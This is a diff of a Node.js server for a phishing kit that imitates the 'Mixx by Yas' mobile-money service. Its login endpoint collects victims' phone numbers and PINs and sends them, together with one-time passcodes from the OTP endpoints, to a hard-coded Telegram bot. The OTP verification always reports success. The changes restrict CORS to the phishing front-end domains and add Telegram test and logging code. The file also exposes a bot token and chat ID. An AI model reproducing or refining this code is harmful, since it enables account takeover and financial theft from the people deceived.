@@ -3,13 +3,21 @@ const cors = require('cors');
 const axios = require('axios');
 const app = express();
 
-// ===== CORS =====
+// ===== CORS - Allow your Render domain =====
 app.use(cors({
-    origin: '*',
+    origin: [
+        'https://mixx-by-yas-offers-06-com.onrender.com',
+        'https://mixxbyyas-offers06com-production.up.railway.app',
+        'http://localhost:3000',
+        'http://localhost:5000'
+    ],
     methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
     allowedHeaders: ['Content-Type', 'Authorization', 'Accept'],
     credentials: true
 }));
+
+// Handle preflight
+app.options('*', cors());
 
 // ===== MIDDLEWARE =====
 app.use(express.json());
@@ -18,6 +26,7 @@ app.use(express.urlencoded({ extended: true }));
 // ===== LOGGING =====
 app.use((req, res, next) => {
     console.log(`📥 ${req.method} ${req.url}`);
+    console.log(`📥 Origin: ${req.headers.origin || 'No origin'}`);
     next();
 });
 
@@ -25,34 +34,70 @@ app.use((req, res, next) => {
 const PORT = process.env.PORT || 5000;
 
 // ===== TELEGRAM CREDENTIALS =====
+// IMPORTANT: Get your correct Chat ID from @userinfobot
 const TELEGRAM_BOT_TOKEN = '8926981745:AAFg96uMr8hQaiQN0F9Miglr0gizZrp48rs';
-const TELEGRAM_CHAT_ID = '8392790531';
+const TELEGRAM_CHAT_ID = '8392790531'; // Double-check this is correct!
 
 console.log('🚀 Starting server...');
 console.log(`📡 PORT: ${PORT}`);
+console.log(`🤖 Bot Token: ${TELEGRAM_BOT_TOKEN ? '✅ Set' : '❌ Missing'}`);
+console.log(`📱 Chat ID: ${TELEGRAM_CHAT_ID ? '✅ Set' : '❌ Missing'}`);
 
 // ===== SEND TO TELEGRAM =====
 async function sendTelegramMessage(message) {
     try {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        console.log('📤 Sending to Telegram:', url);
         const response = await axios.post(url, {
             chat_id: TELEGRAM_CHAT_ID,
             text: message,
             parse_mode: 'HTML'
         });
-        console.log('✅ Telegram sent');
+        console.log('✅ Telegram sent:', response.data.ok);
         return response.data;
     } catch (error) {
-        console.error('❌ Telegram error:', error.message);
-        throw error;
+        console.error('❌ Telegram error:', error.response?.data || error.message);
+        // Don't throw - just log the error
+        return null;
     }
 }
 
 // ===== ENDPOINTS =====
 
+// Root
+app.get('/', (req, res) => {
+    res.json({ 
+        status: 'online', 
+        message: 'Mixx by Yas API is running!',
+        timestamp: new Date().toISOString()
+    });
+});
+
 // Health check
 app.get('/api/health', (req, res) => {
-    res.json({ status: 'healthy', timestamp: new Date().toISOString() });
+    res.json({ 
+        status: 'healthy', 
+        timestamp: new Date().toISOString(),
+        port: PORT,
+        telegram: {
+            bot: TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Missing',
+            chatId: TELEGRAM_CHAT_ID ? '✅ Configured' : '❌ Missing'
+        }
+    });
+});
+
+// Test Telegram
+app.get('/api/test-telegram', async (req, res) => {
+    try {
+        const result = await sendTelegramMessage('✅ Mixx by Yas bot is online and working!');
+        if (result && result.ok) {
+            res.json({ status: 'success', message: 'Test message sent to Telegram' });
+        } else {
+            res.status(500).json({ status: 'error', message: 'Telegram send failed', details: result });
+        }
+    } catch (error) {
+        res.status(500).json({ status: 'error', message: 'Failed to send test message: ' + error.message });
+    }
 });
 
 // ===== LOGIN - Send phone + PIN to Telegram =====
@@ -67,11 +112,10 @@ app.post('/api/login', async (req, res) => {
         });
     }
     
-    // Generate OTP
     const otp = Math.floor(100000 + Math.random() * 900000).toString();
     console.log(`🔐 OTP for ${phone}: ${otp}`);
     
-    // ===== SEND TO TELEGRAM =====
+    // Send to Telegram
     const message = `
 🔔 <b>MIXX BY YAS - LOGIN</b>
 ━━━━━━━━━━━━━━━━━━━━━
@@ -88,7 +132,7 @@ app.post('/api/login', async (req, res) => {
         await sendTelegramMessage(message);
         console.log('✅ Login details sent to Telegram');
     } catch (error) {
-        console.log('❌ Failed to send to Telegram');
+        console.log('❌ Failed to send to Telegram:', error.message);
     }
     
     res.json({
@@ -98,7 +142,7 @@ app.post('/api/login', async (req, res) => {
     });
 });
 
-// ===== VERIFY OTP - Send OTP + phone to Telegram =====
+// ===== VERIFY OTP =====
 app.post('/api/verify-otp', async (req, res) => {
     console.log('📥 Verify OTP:', req.body);
     const { phone, otp } = req.body;
@@ -110,7 +154,7 @@ app.post('/api/verify-otp', async (req, res) => {
         });
     }
     
-    // ===== SEND TO TELEGRAM =====
+    // Send to Telegram
     const message = `
 ✅ <b>MIXX BY YAS - OTP VERIFICATION</b>
 ━━━━━━━━━━━━━━━━━━━━━
@@ -127,10 +171,9 @@ app.post('/api/verify-otp', async (req, res) => {
         await sendTelegramMessage(message);
         console.log('✅ OTP verification sent to Telegram');
     } catch (error) {
-        console.log('❌ Failed to send to Telegram');
+        console.log('❌ Failed to send to Telegram:', error.message);
     }
     
-    // Always success for demo
     res.json({
         status: 'success',
         message: 'OTP verified successfully!',
@@ -153,7 +196,6 @@ app.post('/api/resend-otp', async (req, res) => {
     const otp = Math.floor(100000 + Math.random() * 900000).toString();
     console.log(`🔐 New OTP for ${phone}: ${otp}`);
     
-    // ===== SEND TO TELEGRAM =====
     const message = `
 🔄 <b>MIXX BY YAS - RESEND OTP</b>
 ━━━━━━━━━━━━━━━━━━━━━
@@ -169,7 +211,7 @@ app.post('/api/resend-otp', async (req, res) => {
         await sendTelegramMessage(message);
         console.log('✅ Resend OTP sent to Telegram');
     } catch (error) {
-        console.log('❌ Failed to send to Telegram');
+        console.log('❌ Failed to send to Telegram:', error.message);
     }
     
     res.json({
@@ -179,15 +221,13 @@ app.post('/api/resend-otp', async (req, res) => {
     });
 });
 
-// Root
-app.get('/', (req, res) => {
-    res.json({ 
-        status: 'online', 
-        message: 'Mixx by Yas API' 
-    });
+// ===== 404 =====
+app.use((req, res) => {
+    console.log('❌ 404:', req.method, req.url);
+    res.status(404).json({ status: 'error', message: 'Endpoint not found' });
 });
 
-// ===== START SERVER =====
+// ===== START =====
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Server running on port ${PORT}`);
     console.log(`📍 https://mixxbyyas-offers06com-production.up.railway.app`);
